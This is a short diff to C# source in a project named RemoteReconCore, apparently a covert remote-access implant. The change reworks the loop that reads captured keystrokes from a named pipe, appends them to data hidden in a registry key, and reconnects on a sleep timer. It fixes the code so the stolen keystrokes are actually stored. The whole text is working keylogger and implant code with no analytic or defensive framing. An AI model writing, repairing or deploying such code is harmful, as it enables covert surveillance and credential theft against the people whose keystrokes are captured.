@@ -53,13 +53,19 @@ namespace RemoteReconCore
 #endif
             while(client.IsConnected)
             {
-                StreamReader sr = new StreamReader(client);
-
+                
                 string oldVal = Encoding.Unicode.GetString(Convert.FromBase64String((string)Agent.rrbase.GetValue(Agent.kkey)));
-                string retVal = sr.ReadToEnd();
-                string newStrokes = Encoding.Unicode.GetString(Convert.FromBase64String(retVal));
-                oldVal = oldVal + newStrokes;
-                Agent.rrbase.SetValue(Agent.kkey, (string)Agent.kkey);
+                byte[] msg = new byte[1024];
+                client.ReadMode = PipeTransmissionMode.Byte;
+                client.Read(msg, 0, msg.Length);
+                string newVal = Encoding.Unicode.GetString(msg);
+                oldVal = oldVal + newVal;
+#if DEBUG 
+                Console.Write(oldVal);
+#endif
+                Agent.rrbase.SetValue(Agent.kkey, oldVal);
+
+                client.Connect(Agent.sleep * 1000);
             }
 
 #if DEBUG
